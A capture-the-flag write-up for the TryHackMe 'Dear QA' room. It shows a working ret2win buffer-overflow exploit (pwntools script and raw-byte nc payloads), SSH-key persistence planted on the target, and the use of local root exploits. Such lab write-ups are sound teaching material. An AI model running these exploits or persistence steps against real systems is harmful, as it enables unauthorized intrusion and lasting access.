# Dear QA

Are you able to solve this challenge involving reverse engineering and exploit development?

Room: https://tryhackme.com/room/dearqa

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/dearqa.md

---

## Enumeration

I started with a full TCP scan.

```bash
nmap -sV -sC -p- 10.67.189.116
```

The useful ports were:

```text
22/tcp   open  ssh
111/tcp  open  rpcbind
5700/tcp open  custom service
```

Port `5700` was the important one.

Connecting to it showed a simple prompt.

```bash
nc 10.67.189.116 5700
```

```text
Welcome dearQA
I am sysadmin, i am new in developing
What's your name:
```

The service asks for a name and prints it back.

## Inspecting the Binary

The room provided a downloadable binary called `dear.DearQA`.

I checked the file type.

```bash
file dear.DearQA
```

```text
dear.DearQA: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

The binary architecture answer was:

```text
x64
```

Because the binary was not stripped, useful symbols were still available.

I checked strings in the binary.

```bash
strings -a dear.DearQA
```

Interesting strings included:

```text
Congratulations!
You have entered in the secret function!
/bin/bash
Welcome dearQA
I am sysadmin, i am new in developing
What's your name:
Hello: %s
vuln
main
```

The `vuln` symbol, success message, and `/bin/bash` string suggested this was a ret2win challenge.

## Disassembling the Binary

I used `objdump` to inspect the binary.

```bash
objdump -d dear.DearQA
```

The `main` function allocates `0x20` bytes on the stack.

```asm
4006c7: 48 83 ec 20     sub    $0x20,%rsp
```

`0x20` is 32 bytes.

Later, the program passes that stack buffer to `scanf`.

```asm
4006fd: 48 8d 45 e0     lea    -0x20(%rbp),%rax
400701: 48 89 c6        mov    %rax,%rsi
400704: bf 51 08 40 00  mov    $0x400851,%edi
40070e: e8 6d fe ff ff  call   400580 <__isoc99_scanf@plt>
```

This is unsafe because the input is read into a 32 byte stack buffer without a length limit.

The hidden function was named `vuln` and started at:

```text
0x400686
```

The `vuln` function prints the congratulations message and calls `/bin/bash`.

## Calculating the Offset

The vulnerable buffer is 32 bytes.

On x64, the saved base pointer is another 8 bytes.

```text
32 byte buffer + 8 byte saved RBP = 40 byte offset
```

So the payload structure is:

```text
"A" * 40 + address of vuln
```

The address of `vuln` is:

```text
0x400686
```

In little endian, that address is:

```text
\x86\x06\x40\x00\x00\x00\x00\x00
```

## Exploiting the Service

I used pwntools to build and send the payload to the remote service.

```python
from pwn import *

host = "10.67.189.116"
port = 5700

payload = b"A" * 40
payload += p64(0x400686)

r = remote(host, port)
r.recvuntil(b"name:")
r.sendline(payload)
r.interactive()
```

The exploit successfully redirected execution into the hidden function.

```text
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
ctf@ip-10-67-189-116:/home/ctf$
```

The warning about job control is normal for this kind of shell. It still gives command execution as the `ctf` user.

## Manual Payload Version

The same payload can also be generated manually with Python and piped into `nc`.

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\x86\x06\x40\x00\x00\x00\x00\x00" + b"\n")' | nc 10.67.189.116 5700
```

This works because Python writes the raw bytes for the return address.

Typing the payload directly into `nc` does not work properly because the address contains null bytes.

## Keeping the Shell Open

To keep stdin open after sending the payload, I wrote the payload to a file and used `cat payload.bin -`.

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\x86\x06\x40\x00\x00\x00\x00\x00" + b"\npython3 -c '\''import pty; pty.spawn(\"/bin/bash\")'\''\n")' > payload.bin
```

Then I sent it to the service.

```bash
cat payload.bin - | nc 10.67.189.116 5700
```

This sent the exploit, spawned `/bin/bash`, and then ran a Python PTY upgrade.

```text
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
ctf@ip-10-67-189-116:/home/ctf$ python3 -c 'import pty; pty.spawn("/bin/bash")'
ctf@ip-10-67-189-116:/home/ctf$
```

## Getting a Stable SSH Shell

The ret2win shell worked, but SSH was open, so I added my SSH public key for a cleaner shell.

On my attacking machine, I generated a key.

```bash
ssh-keygen -t ed25519 -f ./dearqa_ctf -N ''
```

Then I displayed the public key.

```bash
cat dearqa_ctf.pub
```

On the target shell, I created the `.ssh` directory and added the public key.

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA... attacker@box' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Then I connected over SSH.

```bash
ssh -i ./dearqa_ctf ctf@10.67.189.116
```

This gave a clean shell.

```text
ctf@ip-10-67-189-116:~$
```

I confirmed the user.

```bash
id
```

```text
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
```

## User Flag

The user flag was in the `ctf` user’s home directory.

```bash
ls -la /home/ctf
```

```text
-r--r--r-- 1 ctf ctf 22 Jul 24 2021 flag.txt
```

I read it with:

```bash
cat /home/ctf/flag.txt
```

```text
THM{...}
```

## Optional: Privilege Escalation Testing

Root access was not required for the room, and there was no separate root flag challenge. After getting a stable shell as `ctf`, I tested local privilege escalation out of curiosity.

First, I tried DirtyFrag, but it did not work on this target.

```bash
./exp
```

```text
dirtyfrag: failed (rc=4)
```

A different local privilege escalation path, `copy-fail`, worked.

```bash
python3 copy-fail.py --exec /bin/bash
```

This spawned a root shell.

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

With root access, I was able to read the protected source file.

```bash
cat /home/ctf/dearqa.c
```

The source confirmed the vulnerability.

```c
#include <stdio.h>

void vuln(){
    printf("Congratulations!\n");
    printf("You have entered in the secret function!\n");
    fflush(stdout);
    execve("/bin/bash",NULL,NULL);
}

int main(){
  char hello[32];
  printf("Welcome dearQA\n");
  printf("I am sysadmin, i am new in developing\n");
  printf("What's your name: ");
  fflush(stdout);
  scanf("%s",&hello);
  printf("Hello: %s\n",hello);
  return 0;
}
```

The vulnerable line is:

```c
scanf("%s",&hello);
```

This optional root step was only used to confirm the source code. The intended challenge was completed with the ret2win exploit and the user flag.

## Summary

Dear QA was a straightforward x64 ret2win challenge.

Key points:

* The binary was a 64-bit ELF.
* It was dynamically linked and not stripped.
* The service on port `5700` ran the vulnerable binary.
* `main` used `scanf("%s", &hello)` with a 32 byte stack buffer.
* The return address offset was 40 bytes.
* The hidden `vuln` function was at `0x400686`.
* Returning to `vuln` spawned `/bin/bash`.
* A clean SSH shell was created by adding an SSH public key for `ctf`.
* Root access was optional and not required for the room.
